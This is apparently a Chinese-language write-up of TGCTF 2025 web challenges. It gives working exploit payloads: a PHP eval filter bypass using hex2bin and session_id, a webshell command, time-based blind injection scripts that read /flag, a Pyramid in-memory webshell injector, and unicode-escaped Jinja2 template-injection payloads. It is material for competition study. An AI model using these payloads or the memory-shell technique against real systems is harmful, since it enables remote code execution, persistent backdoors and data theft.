# TGCTF

## **AAA偷渡阴平**

```php
 <?php

$tgctf2025=$_GET['tgctf2025'];

if(!preg_match("/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i", $tgctf2025)){
    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi
    eval($tgctf2025);
}
else{
    die('(╯‵□′)╯炸弹！•••*～●');
}

highlight_file(__FILE__);
```

没有限制`()!\ system hex2bin session`

```Plain
/?tgctf2025=session_start();system(hex2bin(session_id()));
Cookie: PHPSESSID=636174202f666c6167
```

## **前端GAME**

CVE-2025-30208/31125/32395

## **火眼辩魑魅**

`robots.txt`

`tgshell.php`

```php
<?php
exec($_POST['cmd']);
```

```Plain
cmd=$a='sys'.'tem';$a('ls')
```

## **熟悉的配方，熟悉的味道**

```python
from pyramid.config import Configurator
from pyramid.request import Request
from pyramid.response import Response
from pyramid.view import view_config
from wsgiref.simple_server import make_server
from pyramid.events import NewResponse
import re
from jinja2 import Environment, BaseLoader

eval_globals = { #防止eval执行恶意代码
    '__builtins__': {},      # 禁用所有内置函数
    '__import__': None       # 禁止动态导入
}


def checkExpr(expr_input):
    expr = re.split(r"[-+*/]", expr_input)
#################################################################################
    print(exec(expr_input))###############核心在这（无回显）########################
#################################################################################
    if len(expr) != 2:
        return 0
    try:
        int(expr[0])
        int(expr[1])
    except:
        return 0

    return 1


def home_view(request):
    expr_input = ""
    result = ""

    if request.method == 'POST':
        expr_input = request.POST['expr']
        if checkExpr(expr_input):
            try:
                result = eval(expr_input, eval_globals)
            except Exception as e:
                result = e
        else:
            result = "爬！"


    template_str = 【xxx】

    env = Environment(loader=BaseLoader())
    template = env.from_string(template_str)
    rendered = template.render(expr_input=expr_input, result=result)
    return Response(rendered)


if __name__ == '__main__':
    with Configurator() as config:
        config.add_route('home_view', '/')
        config.add_view(home_view, route_name='home_view')
        app = config.make_wsgi_app()

    server = make_server('0.0.0.0', 9040, app)
    server.serve_forever()
```

```python
__import__('time').sleep(2*(__import__('os').popen("ls").read()[0]!='a'))

```

盲注：

```python
import requests
import string
import time

url = "http://127.0.0.1:8129/"
expr_template = "__import__('time').sleep(2*(__import__('os').popen(\"cat /flag*\").read()[{}]=='{}'))"

result = ""

for i in range(100):
    for c in "{}-_" + string.ascii_letters + string.digits:
        payload = expr_template.format(i, c)
        start = time.time()
        requests.post(url, data={"expr": payload})
        if time.time() - start > 1.6:
            result += c
            print(result)

```

二分：

```python
import requests
import time

url = "http://127.0.0.1:11682/"
expr_template = "__import__('time').sleep(1.6*(__import__('os').popen(\"cat /flag*\").read()[{}]<='{}'))"

# ASCII 0~122
charset = [chr(i) for i in range(30, 128)]

result = ""

for i in range(100):
    l = 0
    r = len(charset)-1
    while l <= r:
        mid = (l + r) // 2
        mid_char = charset[mid]
        payload = expr_template.format(i, mid_char)
        start = time.time()
        requests.post(url, data={"expr": payload})
        elapsed = time.time() - start
        if elapsed > 1.5:
            r = mid - 1
        else:
            l = mid + 1
    result += charset[l]
    print(result)
```

内存马：[奇安信攻防社区-强网杯S8决赛Pyramid框架下内存马的分析构造及RS加密签名伪造](https://forum.butian.net/share/3974)

```python
import requests

code = '''  
def waff():  
    def f():
        yield g.gi_frame.f_back  
    g = f()
    frame = next(g)       
    b = frame.f_back.f_back.f_globals  
    def hello(request):
        code = request.POST['code']
        res=eval(code)
        return Response(res)  
    config.add_route('shellb', '/shellb')
    config.add_view(hello, route_name='shellb')
    config.commit()  
waff()  
'''

url = "http://127.0.0.1:8129/"
data = {
    "expr": f"{code}+1"
}
r = requests.post(url=url, data=data)
```

## **直面天命**

`/hint`

`/aazz?filename=app.py`

```python
import os
import string
from flask import Flask, request, render_template_string, jsonify, send_from_directory
from a.b.c.d.secret import secret_key

app = Flask(__name__)

black_list = ['{', '}', 'popen', 'os', 'import', 'eval', '_', 'system', 'read', 'base', 'globals']


def waf(name):
    for x in black_list:
        if x in name.lower():
            return True
    return Falsedef
    is_typable(char):
    # 定义可通过标准 QWERTY 键盘输入的字符集  
    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
    return char in typable_chars


@app.route('/')
def home():
    return send_from_directory('static', 'index.html')


@app.route('/jingu', methods=['POST'])
def greet():
    template1 = ""
    template2 = ""
    name = request.form.get('name')
    template = f'{name}'
    if waf(name):
        template = '想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹<br><img src="{{  url_for("static", filename="3.jpeg") }}" alt="Image">'
    else:
        k = 0
        for i in name:
            if is_typable(i):
                continue
            k = 1
            break
        if k == 1:
            if not (secret_key[:2] in name and secret_key[2:]):
                template = '连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧<br><br>再去西行历练历练<br><br><img src="{{  url_for("static", filename="4.jpeg") }}" alt="Image">'
                return render_template_string(template)
            template1 = "“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}”<br>最后，如果你用了cat，就可以见到齐天大圣了<br>"
            template = template.replace("直面", "{{").replace("天命", "}}")
            template = template
    if "cat" in template:
        template2 = '<br>或许你这只叫天命人的猴子，真的能做到？<br><br><img src="{{  url_for("static", filename="2.jpeg") }}" alt="Image">'
    try:
        return template1 + render_template_string(template) + render_template_string(template2)
    except Exception as e:
        error_message = f"500报错了，查询语句如下：<br>{template}"
        return error_message, 400


@app.route('/hint', methods=['GET'])
def hinter():
    template = "hint：<br>有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!"
    return render_template_string(template)


@app.route('/aazz', methods=['GET'])
def finder():
    filename = request.args.get('filename', '')
    if filename == "":
        return send_from_directory('static', 'file.html')

    if not filename.replace('_', '').isalnum():
        content = jsonify({'error': '只允许字母和数字！'}), 400
    if os.path.isfile(filename):
        try:
            with open(filename, 'r') as file:
                content = file.read()
            return content
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    else:
        return jsonify({'error': '路径不存在或者路径非法'}), 404


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

```

```
name=直面lipsum['\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f']['\u006f\u0073']['\u0070\u006f\u0070\u0065\u006e']('cat /flag*')|attr('\u0072\u0065\u0061\u0064')()天命
```

```
name=天命[]['\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f']['\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f']['\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f']()[132]['\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f']['\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f']['\u0070\u006f\u0070\u0065\u006e']('mkdir static;cat /tg* > ./static/1')难违
```

















